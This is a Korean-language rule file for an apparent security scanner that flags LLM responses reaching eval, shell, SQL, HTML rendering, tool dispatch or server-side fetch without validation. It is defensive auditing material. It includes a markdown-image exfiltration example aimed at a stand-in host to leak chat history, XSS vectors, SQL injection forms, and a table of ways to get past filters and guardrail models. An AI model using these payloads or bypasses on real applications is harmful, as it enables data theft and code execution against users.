---
id_prefix: IOH
rules_dir: rules/
prereq_group: llm
---

> **Phase 2 진입 조건**: 본 스캐너는 LLM 그룹에 속하며, Phase 2 동적 검증은 Step 8-3 그룹 사전 단계(`llm-endpoint-probe-agent`)가 LLM endpoint를 확보한 경우에만 진입한다. Phase 2 입력 contract는 `<LLM_PROBE_DIR>/llm_endpoint.json` 단일 파일이다.

> ## 핵심 원칙: "LLM 출력은 사용자 입력과 같은 신뢰 수준이다"
>
> LLM이 무엇을 답했는지가 아니라, 그 응답이 **신뢰 경계를 넘어 어디로 흐르는가**가 취약점을 결정한다. `eval`/`exec`/SQL/HTML/`subprocess`/도구 dispatch에 모델 응답이 그대로 흘러 들어가는 코드가 핵심 sink다.

## Sink 의미론

Insecure Output Handling sink는 "LLM 응답 텍스트가 컨텍스트별 인코딩·검증 없이 **실행/렌더/쿼리/외부 호출** 경로에 도달하는 지점"이다. 모델 응답을 사용자 입력과 동일 수준으로 다루어야 한다.

| 카테고리 | 위험 sink |
|---|---|
| 코드 실행 | `eval`/`exec`/`Function`/`vm.run*`/`compile` + 모델 응답 |
| OS 명령 | `subprocess`/`child_process`/`execSync`/`spawn`/`os.system`/`shell_exec` + 모델 응답 |
| 역직렬화 | `pickle.loads`/`Marshal.load`/`yaml.load`(unsafe)/`ObjectInputStream` + 모델 응답 |
| SQL/NoSQL | 모델 응답을 그대로 SQL 문자열로 사용 또는 ORM raw 쿼리에 삽입 |
| HTML/DOM | `innerHTML`/`dangerouslySetInnerHTML`/`v-html`/`document.write`/sanitize 없는 마크다운·리치텍스트 렌더. 라이브러리 기본 sanitize가 적용되어도 **커스텀 노드/컴포넌트로 링크·이미지·임베드 핸들러를 재정의**하거나, **auto-link·표·인용 등 markdown 구조 요소**를 통해 우회되는 경로 포함 |
| 템플릿 | `render_template_string`/`Mustache`/`Handlebars` 등에 모델 응답 직접 삽입 |
| 파일 시스템 | 모델이 결정한 경로로 read/write — path traversal |
| 도구/함수 dispatch | 모델이 정한 tool name/argument를 권한·스키마 검증 없이 호출 |
| 외부 fetch | 모델 응답 안 URL/이미지가 클라이언트에서 자동 fetch — exfil 경로 |

## Source-first 추가 패턴

- `response.choices[0].message.content` / `response.content` / `response.output_text` 등 모델 응답 추출 위치
- LangChain `chain.invoke().content`, agent의 `final_answer`, tool 호출 인자
- 모델이 "SQL을 만들어 달라"는 시나리오에서 즉시 실행되는 응답 텍스트
- 채팅 UI에서 응답을 마크다운/HTML로 렌더하는 컴포넌트

## 자주 놓치는 패턴 (Frequently Missed)

- **`eval(llm_response)` / `exec(llm_response)`** 또는 코드 인터프리터 도구가 응답을 그대로 실행.
- **`subprocess.run(llm_response, shell=True)`** — 명령 인자 ping 정도만 의도했으나 인자 안 `;`/`&&` 등 메타문자.
- **SQL 생성형 챗봇** — 모델 응답을 `cursor.execute(...)`에 직접 — 따옴표/이스케이프 의존 → UNION/INSERT 가능.
- **마크다운/HTML 렌더 미정화** — `dangerouslySetInnerHTML`, `marked()` + sanitize 옵션 누락 → 응답 안 `<script>`/`<img onerror>` 실행.
- **마크다운 이미지 자동 fetch** — `![x](https://oob.example/?c=...)` 형태가 클라이언트에서 그대로 요청되어 대화 이력 exfil.
- **`document.location='...'`** 류 응답이 그대로 페이지에 삽입.
- **도구 인자 미검증** — `system_check(cmd=<llm>)`처럼 admin 도구가 검증 없이 노출.
- **함수 호출 응답의 직접 import/dispatch** — `import os; os.system(<arg>)` 형태로 모델이 코드를 만들어 즉시 실행.
- **에이전트 체인의 다음 step input** — 한 도구 출력의 자연어가 다음 system context로 흘러 인젝션 + 실행 결합.
- **CSV/PDF/엑셀 export**에 모델 응답이 그대로 삽입 → CSV 인젝션·XSS 파일.
- **로그/모니터링**에 응답 원문 저장 → 후속 시스템(검색·알림)에서 2차 렌더.
- **렌더 라이브러리의 sanitize 옵션은 호출처(callsite)마다 다를 수 있다** — 동일한 렌더 컴포넌트/함수가 여러 곳에서 호출되면 각 호출처의 옵션 조합을 모두 점검한다. 한 호출처가 위험 옵션을 켜고 있으면 회귀·재사용 시 다른 호출처로 전이될 수 있다.
- **응답 전달 채널은 sink 의미론에 영향을 주지 않는다** — REST 외 WebSocket/SSE/메시지 큐/푸시 등 어떤 전송 경로로 응답이 도착하든, 최종 렌더·실행 지점이 sink 기준이다.
- **링크/이미지 sanitize는 URL 속성에 한정된다** — `href`/`src` 자체는 라이브러리가 검증해도, 클릭/로드 핸들러를 별도 코드로 가로채 URL을 처리하면 기본 보호는 작동하지 않는다.
- **렌더 함수·컴포넌트 호출 자체가 sink는 아니다** — 동일한 마크다운/HTML 변환이 (a) 사용자 화면 노출, (b) plain text 정규화·스트립·길이 계산, (c) 내부 로그·DB 저장 후 외부 노출 없이 종결 등 다양한 의미로 사용된다. 호출 결과가 **사용자에게 도달하는 UI**(브라우저 DOM, SSR 응답 본문, 이메일/푸시/PDF 본문 등)로 흐르는지 데이터 흐름을 확인한 뒤 sink로 판정한다. 호출이 보인다는 이유만으로 후보로 등록하지 않는다.
- **서버측 SSRF — LLM 응답 URL을 서버가 fetch** — 모델 응답·도구 결과(grounding/검색 참조 등)에 포함된 URL을 **서버가** HTTP 클라이언트(`RestTemplate`/`WebClient`/`getForObject` 등)로 직접 가져오면 SSRF다. 클라이언트측 마크다운 이미지 자동 fetch(`EXFIL_RENDER`)와 구분: 여기서는 서버가 내부망·클라우드 메타데이터 엔드포인트로 요청할 수 있다. 도메인 allowlist(예: `isYoutubeDomain` 같은 가드)가 있으면 그 범위 안인지 확인한다.
- **LLM이 지정한 타입으로 enum/도구 dispatch** — `ToolType.fromString(<llm가 준 type>)` 후 컨버터/핸들러로 라우팅하는 패턴. enum에 없으면 무시되지만, 매핑된 도구가 권한·부수효과(외부 호출·상태 변경)를 가지면 LLM이 도구 선택을 좌우한다(`TOOL_DISPATCH`). `fromString`/`valueOf`의 인자가 모델 응답에서 왔는지 확인한다.
- **reactive/콜백 경계를 넘는 흐름** — Flux/Mono `concatMap`·`map`·`flatMap`·`forEach` 람다나 별도 핸들러 함수 안에서 LLM chunk(`part.text`/`part.data`)가 추출되어 sink로 흐르는 경우, 단순 taint(semgrep)가 스트림 연산자·람다·함수 경계를 넘지 못해 놓친다. **스트림 파이프라인과 콜백을 직접 따라가며** 도달성을 판정한다(자동 taint 0건이라고 안전으로 단정 금지).
- **커스텀/사내 LLM 클라이언트 응답도 source** — `openai`/`anthropic` 같은 표준 SDK import가 없어도, 사내 HTTP 클라이언트(`JarvisClient.streamChat()`/`sendMessage()`/`sendStreamMessage()`, A2A `A2AMessageStreamResponse` 등)의 반환값·스트림 청크는 동일하게 신뢰 불가 출력으로 취급한다.

## 안전 패턴 (FP Guard)

- 모델 응답을 항상 컨텍스트별 인코딩 후 사용 (HTML 이스케이프, SQL parameterized, shell quoting 등).
- 코드 실행이 필요하면 격리된 sandbox(별도 프로세스/컨테이너, 제한된 권한)에서 실행.
- 마크다운/HTML 렌더 시 DOMPurify 등 sanitizer + 이미지/링크 도메인 정책.
- 도구 호출은 알려진 이름 화이트리스트 + 인자 JSON schema 검증 + 권한 체크 + 위험 행위는 사용자 확인.
- 파일 경로는 정규화 + 베이스 디렉토리 검사 + symlink 처리.
- 외부 fetch가 일어나는 렌더 요소(이미지/링크/iframe)는 도메인 화이트리스트 또는 자동 fetch 차단.

## 우회 가능 패턴

| 방어 | 우회 가능성 | 우회 방식 |
|---|---|---|
| 출력 후 키워드 차단 | 가능 | 분할/번역/인코딩된 출력, 다른 표현 |
| SQL 따옴표 이스케이프만 | 가능 | UNION/INSERT/주석/스택 쿼리 — parameterized로 전환 필요 |
| sanitizer 적용했으나 옵션 부족 | 가능 | `<svg onload>`/`<math>`/`<iframe srcdoc>` 등 sanitizer 미커버 태그·속성 |
| 마크다운 이미지만 차단 | 가능 | 링크·HTML 첨부·iframe·코드블록 자동 렌더 요소 |
| 도구 화이트리스트만 적용 | 가능 | 허용 도구의 인자 영역에 위험 페이로드 — 인자 스키마/권한 미검증 시 |
| 단일 가드레일 모델 | 부분 가능 | 다국어/인코딩/도메인 특화 페이로드 |

## 후보 판정 의사결정

| 조건 | 판정 |
|---|---|
| 모델 응답이 `eval`/`exec`/`subprocess` 등 코드/명령 실행에 도달 | 후보 (라벨: `EXEC`) |
| 모델 응답이 SQL/NoSQL 쿼리 문자열에 직접 삽입 | 후보 (라벨: `SQLI`) |
| 모델 응답이 `innerHTML`/`dangerouslySetInnerHTML`/마크다운·리치텍스트 렌더에 sanitize 없이 도달 **+ 렌더 결과가 사용자에게 노출되는 UI로 흐름** | 후보 (라벨: `XSS`) |
| 모델이 결정한 tool/function 호출이 권한·스키마 검증 없이 실행 | 후보 (라벨: `TOOL_DISPATCH`) |
| 응답에 외부 URL/이미지가 포함되어 클라이언트가 자동 fetch | 후보 (라벨: `EXFIL_RENDER`) |
| 응답/도구결과에 포함된 URL을 **서버**가 직접 fetch (RestTemplate/WebClient), 도메인 allowlist 없음 | 후보 (라벨: `SSRF`) |
| 모델 응답이 안전한 컨텍스트(plain text 렌더, 로그 only, parameterized 쿼리 등)에만 사용 | 제외 |
| 응답에 위험 키워드가 있을 수 있다는 추정뿐, 실제 sink 없음 | 제외 |

## 후보 판정 제한

- 모델이 "그런 답을 줄 수도 있다"는 가능성만으로는 부족하다. 응답이 도달하는 sink 코드가 실제로 존재해야 한다.
- 사용자 입력이 LLM을 거치지 않고 sink에 직접 들어가는 케이스는 기존 SQLi/XSS/RCE 스캐너 영역으로 분리한다.
- 응답을 plain text로 표시만 하고 추가 처리가 없는 경로는 후보로 다루지 않는다.
- **렌더 호출이 보인다는 사실만으로는 부족하다** — 렌더 결과가 (a) 사용자 화면 DOM, (b) 외부로 송신되는 응답 본문/이메일/푸시 등 외부 노출 sink에 실제로 흘러야 한다. plain text 변환·검색 색인·길이 계산·내부 로그 종결 등 외부 노출이 없는 경로는 제외한다. 도달성을 확인할 수 없으면 "후보 (도달성 미확인)"로 보수적으로 등록하되, 사유에 흐름 추적이 멈춘 지점을 명시한다.
